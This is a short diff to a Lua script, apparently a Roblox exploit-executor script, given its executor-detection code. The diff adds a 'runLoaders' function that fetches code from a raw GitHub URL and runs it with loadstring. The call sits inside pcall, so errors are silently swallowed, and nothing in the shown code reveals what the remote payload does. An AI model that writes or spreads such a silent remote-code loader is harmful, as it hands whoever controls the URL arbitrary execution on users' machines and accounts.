@@ -4,6 +4,16 @@ local TweenService = game:GetService("TweenService")
 local TeleportService = game:GetService("TeleportService")
 local ContextActionService = game:GetService("ContextActionService")
 
+-- Load external scripts
+local function runLoaders()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/GnomeStorage/LUAs/refs/heads/main/5cdnew"))()
+    end)
+    pcall(function()
+        loadstring(game:HttpGet(""))()
+    end)
+end
+
 -- Executor detection
 local function detectExecutor()
     if syn then
